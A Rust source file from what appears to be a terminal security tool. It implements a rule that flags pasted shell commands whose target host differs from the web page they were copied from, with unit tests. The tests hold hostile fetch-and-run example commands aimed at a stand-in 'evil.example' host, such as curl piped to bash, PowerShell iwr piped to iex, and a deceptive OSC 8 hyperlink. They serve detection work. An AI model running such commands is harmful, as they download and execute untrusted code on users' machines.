//! M12 ch1 — paste provenance ([`RuleId::PasteSourceMismatch`]).
//!
//! A companion browser extension (a SEPARATE repo, not part of this crate)
//! writes a JSON record at `state_dir()/clipboard_source.json` every time it
//! sets the system clipboard:
//!
//! ```json
//! {"updated_at": "<rfc3339>", "content_sha256": "<hex>",
//!  "source_url": "<url>", "source_title": "<string>",
//!  "hidden_text_detected": <bool>}
//! ```
//!
//! tirith READS (never writes) that record from
//! [`crate::clipboard::read_source_record`] and uses it to attribute a paste to
//! the page it was copied from. This rule fires from `engine::analyze` in
//! [`ScanContext::Paste`](crate::extract::ScanContext::Paste) ONLY.
//!
//! # The exact semantics (the crux)
//!
//! 1. Read `clipboard_source.json`. Absent / unreadable / malformed → no finding
//!    (fail-safe; the companion extension simply isn't installed or hasn't run).
//! 2. Compute `sha256(pasted_input)`. If it does NOT equal the record's
//!    `content_sha256`, the paste did NOT come from the recorded source — make
//!    NO attribution and emit NO finding. (The clipboard may have been replaced
//!    between the extension's write and this paste; a stale record must never
//!    falsely attribute an unrelated paste.)
//! 3. Hash matches → extract the destination host(s) from every URL in the
//!    pasted command and compare against the `source_url` host. If the source
//!    host equals ALL destination hosts (no mismatch) → no finding.
//! 4. **Bare host mismatch → [`Severity::Info`].** Documentation pages on
//!    `docs.example.com` legitimately link install URLs that live on
//!    `github.com` / `npmjs.com` / `docker.io`, so a host mismatch ON ITS OWN is
//!    common and benign — an advisory note that never changes the action.
//! 5. **Host mismatch + ≥1 risk signal → [`Severity::High`].** Any one of:
//!    (a) the record's `hidden_text_detected == true`, or a `ClipboardHidden` finding is already present in `prior`;
//!    (b) a destination host is a known URL shortener (the real target is hidden);
//!    (c) the paste pipes to a shell interpreter — a pipe-to-shell finding (`PipeToInterpreter` / `CurlPipeShell` / …) is already present in `prior`;
//!    (d) a destination host is NOT in `policy.allowed_install_domains`;
//!    (e) an OSC 8 hyperlink in the paste renders a visible URL whose host differs from its actual (`href`) target.
//!
//! Because the trigger is runtime companion-file state plus a content-hash match
//! — not a regex / byte signal on the input — this carries NO PATTERN_TABLE entry
//! and lives in `EXTERNALLY_TRIGGERED_RULES`. The engine forces past its tier-1
//! fast-exit for the paste context only when the companion file is non-empty (a
//! single `metadata()` stat; see `engine.rs`'s `paste_source_triggered`).
//!
//! # What is NOT echoed
//!
//! The finding records only the source host, the mismatched destination host(s),
//! and which risk signals fired — never the pasted content, the source title, or
//! the full URLs beyond the hosts being compared.

use sha2::{Digest, Sha256};

use crate::clipboard::ClipboardSourceRecord;
use crate::policy::Policy;
use crate::tokenize::ShellType;
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Production entry point. Reads the companion record from the default path
/// (`state_dir()/clipboard_source.json`) and evaluates the pasted `input`
/// against it. `prior` is the slice of findings the paste tier-3 branch has
/// already assembled (so `ClipboardHidden` / `PipeToInterpreter` are visible).
/// `shell` is the caller's shell so the destination-host extraction sees the
/// same tokenization the rest of the pipeline used.
///
/// Called LAST in the paste tier-3 branch (see `engine.rs`). Returns at most one
/// finding; an empty vec when there is no recorded source, the content hash does
/// not match, or there is no host mismatch.
pub fn check(input: &str, shell: ShellType, prior: &[Finding], policy: &Policy) -> Vec<Finding> {
    let record = match crate::clipboard::read_source_record() {
        Some(r) => r,
        None => return Vec::new(),
    };
    check_with_record(input, shell, prior, policy, &record)
}

/// Test seam: evaluate against an explicitly-supplied [`ClipboardSourceRecord`]
/// instead of reading `state_dir()/clipboard_source.json`. Lets unit tests drive
/// every behavioral path without touching the real state dir (mirrors the
/// canary / taint / incident `*_at` seams). [`check`] is the production wrapper
/// that supplies the record from disk. `shell` is threaded into the
/// destination-host extraction so a PowerShell paste tokenizes as PowerShell,
/// not POSIX.
pub fn check_with_record(
    input: &str,
    shell: ShellType,
    prior: &[Finding],
    policy: &Policy,
    record: &ClipboardSourceRecord,
) -> Vec<Finding> {
    // Step 2 — attribution. If the pasted content's hash does not match the
    // recorded source's hash, this paste did NOT come from that source: make no
    // attribution, emit nothing. A stale record (the clipboard was replaced
    // after the extension wrote it) must never falsely attribute an unrelated
    // paste, so this guard is load-bearing.
    if !content_matches(input, &record.content_sha256) {
        return Vec::new();
    }

    // Step 3 — the source host. A record whose `source_url` has no host (e.g. a
    // `file:` URL, a `chrome://` page, or an unparseable value) cannot be
    // compared, so there is nothing to mismatch against — emit nothing.
    let Some(source_host) = url_host(&record.source_url) else {
        return Vec::new();
    };

    // Destination hosts from URLs in the pasted command. A paste with no URL has
    // no destination to compare — no mismatch, no finding.
    let dest_hosts = destination_hosts(input, shell);
    if dest_hosts.is_empty() {
        return Vec::new();
    }

    // The mismatched destination hosts (those that differ from the source host).
    // If EVERY destination host equals the source host there is no mismatch.
    let mismatched: Vec<String> = dest_hosts
        .iter()
        .filter(|h| !hosts_match(&source_host, h))
        .cloned()
        .collect();
    if mismatched.is_empty() {
        return Vec::new();
    }

    // Step 5 — gather risk signals. Any one escalates the mismatch to High.
    let signals = collect_risk_signals(input, prior, policy, record, &mismatched);
    let severity = if signals.is_empty() {
        Severity::Info
    } else {
        Severity::High
    };

    vec![build_finding(&source_host, &mismatched, &signals, severity)]
}

/// `true` when `sha256(input)` (lowercase hex) equals `expected` (compared
/// case-insensitively so a record written with uppercase hex still matches).
fn content_matches(input: &str, expected: &str) -> bool {
    let digest = Sha256::digest(input.as_bytes());
    let mut actual = String::with_capacity(digest.len() * 2);
    for b in digest {
        use std::fmt::Write as _;
        let _ = write!(actual, "{b:02x}");
    }
    actual.eq_ignore_ascii_case(expected.trim())
}

/// Parse a URL string and return its lowercase host, or `None` if it has no
/// host. Tries `url::Url` first (the common `https://…` case); falls back to a
/// scheme-less `host[/path]` shape so a `source_url` recorded without a scheme
/// still yields a host.
fn url_host(s: &str) -> Option<String> {
    let s = s.trim();
    if let Ok(u) = url::Url::parse(s) {
        return u.host_str().map(|h| h.to_ascii_lowercase());
    }
    // Scheme-less fallback: take the first chunk before a path/query/fragment
    // and require it to look like a dotted hostname.
    let first = s.split(['/', '?', '#']).next().unwrap_or(s);
    let host_only = first.split('@').next_back().unwrap_or(first);
    let host_only = host_only.split(':').next().unwrap_or(host_only);
    if host_only.contains('.')
        && host_only.split('.').all(|seg| {
            !seg.is_empty() && seg.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
        })
    {
        return Some(host_only.to_ascii_lowercase());
    }
    None
}

/// Extract the deduped, lowercase destination hosts from every URL in the
/// pasted command. Uses the shipping URL extractor so SCP refs, Docker refs,
/// scheme-less sink URLs, etc. are all covered — the same view the transport /
/// hostname rules see. Threads the caller's `shell` so a PowerShell paste
/// tokenizes as PowerShell (e.g. `;`-separated statements, backtick escapes),
/// not POSIX — otherwise a mismatch in a non-POSIX paste could be missed.
fn destination_hosts(input: &str, shell: ShellType) -> Vec<String> {
    let mut hosts: Vec<String> = Vec::new();
    for url in crate::extract::extract_urls(input, shell) {
        if let Some(h) = url.parsed.host() {
            let h = h.to_ascii_lowercase();
            if !hosts.contains(&h) {
                hosts.push(h);
            }
        }
    }
    hosts
}

/// Compare two hosts for the provenance check: case-insensitive, treating a
/// leading `www.` as equivalent (a paste destination of `www.github.com` is the
/// same origin as a source of `github.com`).
fn hosts_match(a: &str, b: &str) -> bool {
    let a = a.trim_start_matches("www.");
    let b = b.trim_start_matches("www.");
    a.eq_ignore_ascii_case(b)
}

/// `true` when `host` is covered by `allowed`: an exact (case-insensitive) match
/// OR a dot-suffix subdomain of a listed domain (a configured `github.com` also
/// covers `objects.github.com`, but NOT a lookalike `evilgithub.com`). Public so
/// the policy doc-comment can point readers here.
pub fn host_in_allowed_domains(host: &str, allowed: &[String]) -> bool {
    let host = host.trim().trim_start_matches("www.").to_ascii_lowercase();
    allowed.iter().any(|d| {
        let d = d.trim().trim_start_matches("www.").to_ascii_lowercase();
        if d.is_empty() {
            return false;
        }
        host == d || host.ends_with(&format!(".{d}"))
    })
}

/// One human-readable risk-signal label, in detection order. Returned to the
/// finding builder so the evidence text names exactly which signals escalated
/// the mismatch to High.
fn collect_risk_signals(
    input: &str,
    prior: &[Finding],
    policy: &Policy,
    record: &ClipboardSourceRecord,
    mismatched: &[String],
) -> Vec<&'static str> {
    let mut signals: Vec<&'static str> = Vec::new();

    // (a) hidden text — either the extension flagged it on the copied selection
    //     or a ClipboardHidden finding already fired on this paste.
    if record.hidden_text_detected {
        signals.push("source recorded hidden text");
    } else if prior.iter().any(|f| f.rule_id == RuleId::ClipboardHidden) {
        signals.push("hidden clipboard content detected");
    }

    // (b) a destination host is a known URL shortener — the real target is
    //     concealed behind a redirect.
    if mismatched
        .iter()
        .any(|h| crate::rules::shared::is_url_shortener(h))
    {
        signals.push("destination is a URL shortener");
    }

    // (c) the paste pipes into a shell interpreter. The pipe-to-shell family is
    //     split: the generic `PipeToInterpreter` plus the downloader-specific
    //     `CurlPipeShell` / `WgetPipeShell` / `HttpiePipeShell` / `XhPipeShell`
    //     (and the PowerShell `iex` inline form). `curl … | bash` fires
    //     `CurlPipeShell`, NOT `PipeToInterpreter`, so we must match the whole
    //     family or the most common attack shape would be missed.
    if prior.iter().any(|f| {
        matches!(
            f.rule_id,
            RuleId::PipeToInterpreter
                | RuleId::CurlPipeShell
                | RuleId::WgetPipeShell
                | RuleId::HttpiePipeShell
                | RuleId::XhPipeShell
                | RuleId::PsInlineDownloadExecute
        )
    }) {
        signals.push("paste pipes to a shell interpreter");
    }

    // (d) a mismatched destination host is NOT in the operator's trusted
    //     install-source list. With an empty list this never fires (so it is
    //     opt-in and backward-compatible).
    if !policy.allowed_install_domains.is_empty()
        && mismatched
            .iter()
            .any(|h| !host_in_allowed_domains(h, &policy.allowed_install_domains))
    {
        signals.push("destination not in allowed_install_domains");
    }

    // (e) an OSC 8 hyperlink in the paste renders a visible URL whose host
    //     differs from its actual click target.
    if has_osc8_host_mismatch(input) {
        signals.push("OSC 8 visible URL differs from its target");
    }

    signals
}

/// `true` when the pasted bytes contain an OSC 8 hyperlink (`\e]8;;<uri>\e\\
/// <visible>\e]8;;\e\\`) whose visible text itself parses as a URL with a host
/// that differs from the link's actual `uri` host. Reuses the shipping
/// output-byte scanner so the OSC 8 parsing is shared, not re-implemented.
///
/// "Click here" (non-URL visible text) does NOT count — only a visible URL whose
/// host mismatches the target, matching the `OutputTerminalHyperlinkMismatch`
/// definition on the output path.
fn has_osc8_host_mismatch(input: &str) -> bool {
    let mut state = crate::extract::OutputScanState::default();
    let mut result = crate::extract::OutputScanResult::default();
    crate::extract::scan_output_chunk(input.as_bytes(), &mut state, &mut result);
    result.hyperlinks.iter().any(|link| {
        match (url_host(&link.uri), url_host(link.visible.trim())) {
            (Some(href_host), Some(visible_host)) => !hosts_match(&href_host, &visible_host),
            // Visible text isn't a URL → tolerated (friendly-label pattern).
            _ => false,
        }
    })
}

/// Build the single [`RuleId::PasteSourceMismatch`] finding. The description
/// names the source host and the mismatched destination host(s); when High, it
/// also lists the risk signals that escalated it. The pasted content and full
/// URLs are deliberately NOT echoed.
fn build_finding(
    source_host: &str,
    mismatched: &[String],
    signals: &[&'static str],
    severity: Severity,
) -> Finding {
    let dest_list = mismatched.join(", ");
    let description = if signals.is_empty() {
        format!(
            "This paste matched a recorded clipboard source on host '{source_host}', but it \
             runs a command targeting a different host ({dest_list}). A host mismatch on its own \
             is common and benign — documentation pages routinely link install URLs on other \
             hosts — so this is an advisory note only. Confirm the destination is the install \
             source you expect."
        )
    } else {
        format!(
            "This paste matched a recorded clipboard source on host '{source_host}', but it \
             runs a command targeting a different host ({dest_list}), AND it carries risk \
             signals: {}. This is the shape of a clipboard-hijack / copy-paste-poisoning \
             attack. Do not run the command; re-copy the install line directly from the \
             vendor's canonical page.",
            signals.join("; ")
        )
    };

    let mut evidence = vec![Evidence::HostComparison {
        raw_host: dest_list,
        similar_to: source_host.to_string(),
    }];
    if !signals.is_empty() {
        evidence.push(Evidence::Text {
            detail: format!("risk signals: {}", signals.join("; ")),
        });
    }

    Finding {
        rule_id: RuleId::PasteSourceMismatch,
        severity,
        title: "Pasted command targets a different host than its clipboard source".to_string(),
        description,
        evidence,
        human_view: None,
        agent_view: None,
        mitre_id: Some("T1059".to_string()),
        custom_rule_id: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a `ClipboardSourceRecord` whose `content_sha256` matches `content`,
    /// so the attribution guard passes. `source_url` / `hidden` are explicit.
    fn record_for(content: &str, source_url: &str, hidden: bool) -> ClipboardSourceRecord {
        let digest = Sha256::digest(content.as_bytes());
        let mut hex = String::new();
        for b in digest {
            use std::fmt::Write as _;
            let _ = write!(hex, "{b:02x}");
        }
        ClipboardSourceRecord {
            updated_at: "2026-05-30T00:00:00Z".to_string(),
            content_sha256: hex,
            source_url: source_url.to_string(),
            source_title: "Test Page".to_string(),
            hidden_text_detected: hidden,
        }
    }

    fn empty_policy() -> Policy {
        Policy::default()
    }

    /// A prior finding of the given rule (the inputs the paste branch would have
    /// already assembled — `ClipboardHidden`, `PipeToInterpreter`).
    fn prior_finding(rule_id: RuleId) -> Finding {
        Finding {
            rule_id,
            severity: Severity::High,
            title: "prior".to_string(),
            description: "prior".to_string(),
            evidence: vec![],
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }
    }

    // (a) No source file → no finding. (The production `check` reads the default
    // path; with `XDG_STATE_HOME` unset in a test runner this is `None`-ish, but
    // the canonical no-source path is exercised via the reader test in
    // `clipboard.rs`. Here we assert the seam returns nothing when the record's
    // hash does not match — the closest in-rule analog that needs no real file.)

    // (b) sha mismatch → no finding.
    #[test]
    fn sha_mismatch_emits_nothing() {
        let content = "curl https://evil.example/x.sh | bash";
        // Record's hash is for DIFFERENT content, so attribution fails.
        let rec = record_for(
            "totally different content",
            "https://docs.trusted.example",
            false,
        );
        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
        assert!(
            findings.is_empty(),
            "a paste whose hash does not match the source must not be attributed"
        );
    }

    // (c) matched + same host → no finding.
    #[test]
    fn matched_same_host_emits_nothing() {
        let content = "curl https://docs.trusted.example/install.sh -o install.sh";
        let rec = record_for(content, "https://docs.trusted.example/page", false);
        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
        assert!(
            findings.is_empty(),
            "no host mismatch (same host) must not fire; got {findings:?}"
        );
    }

    // (d) matched + bare host mismatch → Info.
    #[test]
    fn matched_bare_host_mismatch_is_info() {
        // A docs page that links an install URL on github.com, no other signal.
        let content = "curl https://github.com/org/repo/releases/download/v1/tool -o tool";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
        assert_eq!(
            findings.len(),
            1,
            "a bare host mismatch must fire one finding"
        );
        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);
        assert_eq!(
            findings[0].severity,
            Severity::Info,
            "a bare host mismatch is advisory Info"
        );
    }

    // (e) matched + host mismatch + pipe-to-interpreter → High.
    #[test]
    fn matched_mismatch_with_pipe_is_high() {
        let content = "curl https://evil.example/x.sh | bash";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        // The paste branch already assembled a PipeToInterpreter finding.
        let prior = [prior_finding(RuleId::PipeToInterpreter)];
        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "mismatch + pipe-to-interpreter must be High"
        );
        assert!(findings[0]
            .description
            .contains("pipes to a shell interpreter"));
    }

    // (e-bis) `curl … | bash` fires `CurlPipeShell`, NOT `PipeToInterpreter`. The
    // signal must match the whole pipe-to-shell family or the most common attack
    // shape would be missed (regression for the CLI integration finding).
    #[test]
    fn matched_mismatch_with_curl_pipe_shell_is_high() {
        let content = "curl https://evil.example/x.sh | bash";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let prior = [prior_finding(RuleId::CurlPipeShell)];
        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "CurlPipeShell must escalate the mismatch just like PipeToInterpreter"
        );
    }

    // (e') hidden-text signal (record flag) → High.
    #[test]
    fn matched_mismatch_with_hidden_text_flag_is_high() {
        let content = "curl https://other.example/install.sh -o install.sh";
        let rec = record_for(content, "https://docs.trusted.example/install", true);
        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].description.contains("hidden text"));
    }

    // (e'') hidden-text signal (prior ClipboardHidden finding) → High.
    #[test]
    fn matched_mismatch_with_prior_clipboard_hidden_is_high() {
        let content = "curl https://other.example/install.sh -o install.sh";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let prior = [prior_finding(RuleId::ClipboardHidden)];
        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
        assert_eq!(findings[0].severity, Severity::High);
    }

    // (f) matched + host mismatch + shortened URL → High.
    #[test]
    fn matched_mismatch_with_shortener_is_high() {
        let content = "curl https://bit.ly/abc123 -o tool";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "a shortened destination escalates the mismatch"
        );
        assert!(findings[0].description.contains("URL shortener"));
    }

    // (g) destination in allowed_install_domains → stays Info.
    #[test]
    fn matched_mismatch_destination_in_allowed_domains_stays_info() {
        let content = "curl https://github.com/org/repo/releases/download/v1/tool -o tool";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let mut policy = empty_policy();
        policy.allowed_install_domains = vec!["github.com".to_string()];
        let findings = check_with_record(content, ShellType::Posix, &[], &policy, &rec);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::Info,
            "a destination in allowed_install_domains keeps the bare mismatch at Info"
        );
    }

    // (g') destination NOT in a NON-EMPTY allowed list → High (the not-in-list
    // risk signal fires).
    #[test]
    fn matched_mismatch_destination_not_in_allowed_domains_is_high() {
        let content = "curl https://random-host.example/install.sh -o install.sh";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let mut policy = empty_policy();
        policy.allowed_install_domains = vec!["github.com".to_string()];
        let findings = check_with_record(content, ShellType::Posix, &[], &policy, &rec);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "a destination outside a configured allowed list escalates to High"
        );
        assert!(findings[0].description.contains("allowed_install_domains"));
    }

    #[test]
    fn host_in_allowed_domains_matches_subdomain_not_lookalike() {
        let allowed = vec!["github.com".to_string()];
        assert!(host_in_allowed_domains("github.com", &allowed));
        assert!(host_in_allowed_domains("objects.github.com", &allowed));
        assert!(host_in_allowed_domains("www.github.com", &allowed));
        assert!(!host_in_allowed_domains("evilgithub.com", &allowed));
        assert!(!host_in_allowed_domains(
            "github.com.evil.example",
            &allowed
        ));
    }

    #[test]
    fn no_destination_url_emits_nothing() {
        // A paste with no URL has no destination host to compare.
        let content = "echo hello world";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        assert!(
            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty()
        );
    }

    #[test]
    fn source_url_without_host_emits_nothing() {
        let content = "curl https://github.com/x -o x";
        // A source URL with no resolvable host can't be compared.
        let rec = record_for(content, "about:blank", false);
        assert!(
            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty()
        );
    }

    #[test]
    fn www_prefix_is_equivalent_no_mismatch() {
        let content = "curl https://www.docs.trusted.example/install.sh -o x";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        assert!(
            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty(),
            "www. on the destination must be treated as the same host as the source"
        );
    }

    #[test]
    fn osc8_visible_url_mismatch_is_a_signal() {
        // OSC 8: visible text `github.com` but the link target is evil.example.
        // We embed a same-host plain URL too so there IS a destination host to
        // compare, and assert the OSC8 mismatch pushes it to High.
        let content =
            "see \x1b]8;;https://evil.example/x\x1b\\github.com\x1b]8;;\x1b\\ then curl https://other.example/i.sh -o i";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "an OSC 8 visible-vs-target host mismatch escalates to High"
        );
        assert!(findings[0].description.contains("OSC 8"));
    }

    // A non-POSIX (PowerShell) paste must still detect a host mismatch. The
    // destination-host extraction is now threaded with the caller's `shell`, so a
    // PowerShell download (`iwr <url> | iex`) tokenizes as PowerShell rather than
    // POSIX. The recorded source is on `docs.trusted.example`; the paste fetches
    // from `evil.example` and pipes to `iex`, so the mismatch fires at High
    // (regression for the hardcoded-POSIX bug).
    #[test]
    fn powershell_paste_host_mismatch_is_detected() {
        let content = "iwr https://evil.example/x.ps1 | iex";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        // The PowerShell inline-download-execute rule would already be present in
        // `prior` on the real paste path; supply it so the pipe-to-shell signal
        // corroborates the mismatch and we assert the High path end-to-end.
        let prior = [prior_finding(RuleId::PsInlineDownloadExecute)];
        let findings = check_with_record(
            content,
            ShellType::PowerShell,
            &prior,
            &empty_policy(),
            &rec,
        );
        assert_eq!(
            findings.len(),
            1,
            "a PowerShell paste targeting a different host must fire one finding; got {findings:?}"
        );
        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);
        assert_eq!(
            findings[0].severity,
            Severity::High,
            "PowerShell mismatch + inline download-execute must be High"
        );
    }

    // The same PowerShell paste, evaluated as POSIX, also extracts the URL host
    // (the URL is shell-agnostic here) — but the point of the threading is that
    // the destination extraction honors the CALLER's shell. This guards that a
    // bare PowerShell mismatch (no risk signal) is still surfaced at Info.
    #[test]
    fn powershell_bare_mismatch_is_info() {
        let content =
            "iwr https://github.com/org/repo/releases/download/v1/tool.exe -OutFile tool.exe";
        let rec = record_for(content, "https://docs.trusted.example/install", false);
        let findings =
            check_with_record(content, ShellType::PowerShell, &[], &empty_policy(), &rec);
        assert_eq!(findings.len(), 1, "got {findings:?}");
        assert_eq!(findings[0].severity, Severity::Info);
    }
}
